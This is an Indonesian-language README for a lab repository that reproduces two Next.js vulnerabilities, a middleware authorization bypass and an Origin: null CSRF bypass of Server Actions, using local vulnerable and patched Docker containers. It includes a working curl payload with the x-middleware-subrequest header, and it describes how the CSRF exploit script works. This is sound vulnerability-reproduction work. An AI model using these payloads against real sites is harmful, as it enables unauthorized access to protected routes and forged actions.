# Next.js CVE Proof of Concept

Repo ini saat ini menyiapkan 2 PoC CVE Next.js yang aktif:

1. `CVE-2025-29927` - Authorization Bypass in Middleware
2. `CVE-2026-27978` - `Origin: null` bypass pada Server Actions CSRF checks

PoC `next/image` yang sempat dibuat sudah dihapus dulu dari repo ini.

## CVE yang dipilih

| CVE | Advisory | Dampak | Versi rentan | Versi patch |
| --- | --- | --- | --- | --- |
| `CVE-2025-29927` | [GHSA-f82v-jwr5-mffw](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw) | bypass proteksi route yang hanya bergantung pada middleware | `15.2.2` | `15.2.3` |
| `CVE-2026-27978` | [GHSA-mq59-m269-xvcx](https://github.com/vercel/next.js/security/advisories/GHSA-mq59-m269-xvcx) | `Origin: null` dapat melewati validasi CSRF Server Actions | `16.1.6` | `16.1.7` |

## Hash rilis dan commit patch

Hash di bawah ini diambil dari upstream `vercel/next.js`:

| CVE | Vulnerable release commit | Fixed release commit | Commit patch yang relevan |
| --- | --- | --- | --- |
| `CVE-2025-29927` | `v15.2.2` -> `f4552826e1ed15fbeb951be552d67c5a08ad0672` | `v15.2.3` -> `535e26d3c69de49df8bd17618a424cbe65ec897b` | `52a078da3884efe6501613c7834a3d02a91676d2` (`Update middleware request header`) |
| `CVE-2026-27978` | `v16.1.6` -> `adf8c612adddd103647c90ff0f511ea35c57076e` | `v16.1.7` -> `bdf3e3577a6d55ea186a48238d61fbd8da07a626` | `9023c0ab70235cdf68e88c14b66290500efa9f7f` (`Disallow Server Action submissions from privacy-sensitive contexts by default`) |

## Struktur repo

```text
.
├─ docker-compose.yml
├─ pocs/
│  ├─ cve-2025-29927/
│  └─ cve-2026-27978/
└─ scripts/
   ├─ run-cve-2025-29927.mjs
   └─ run-cve-2026-27978.mjs
```

## Prasyarat

1. Install Docker Desktop / Docker Engine.
2. Pastikan `docker compose` tersedia.
3. Jalankan command dari root repo ini.

## Menjalankan semua service

```bash
docker compose up --build
```

Port yang dipakai:

- `3001` -> `CVE-2025-29927` vulnerable
- `3002` -> `CVE-2025-29927` fixed
- `3003` -> `CVE-2026-27978` vulnerable
- `3004` -> `CVE-2026-27978` fixed

## Reproduce 1: CVE-2025-29927

Jalankan service:

```bash
docker compose up --build cve-2025-29927-vuln cve-2025-29927-fixed
```

Lalu jalankan PoC:

```bash
node scripts/run-cve-2025-29927.mjs http://localhost:3001
node scripts/run-cve-2025-29927.mjs http://localhost:3002
```

Ekspektasi:

- `3001` mengembalikan redirect tanpa header exploit, tetapi menjadi `200 OK` saat diberi `x-middleware-subrequest`.
- `3002` tetap redirect ke `/login`, karena header internal sudah difilter.

## Reproduce 2: CVE-2026-27978

Jalankan service:

```bash
docker compose up --build cve-2026-27978-vuln cve-2026-27978-fixed
```

PoC:

```bash
node scripts/run-cve-2026-27978.mjs http://localhost:3003
node scripts/run-cve-2026-27978.mjs http://localhost:3004
```

Ekspektasi:

- script login sebagai user victim, mengambil hidden action field dari halaman, lalu mengirim `POST` dengan `Origin: null`.
- pada versi rentan, state transfer berubah.
- pada versi fixed, state tetap dan response gagal karena request dianggap invalid.

## Command manual cepat

### CVE-2025-29927

```bash
curl -i http://localhost:3001/dashboard
curl -i -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://localhost:3001/dashboard
```

### CVE-2026-27978

Gunakan script otomatis karena field action ID dihasilkan server.

## Sumber utama

- [Next.js Security Advisories](https://github.com/vercel/next.js/security/advisories)
- [CVE-2025-29927 advisory](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw)
- [Postmortem middleware bypass](https://vercel.com/blog/postmortem-on-next-js-middleware-bypass)
- [CVE-2026-27978 advisory](https://github.com/vercel/next.js/security/advisories/GHSA-mq59-m269-xvcx)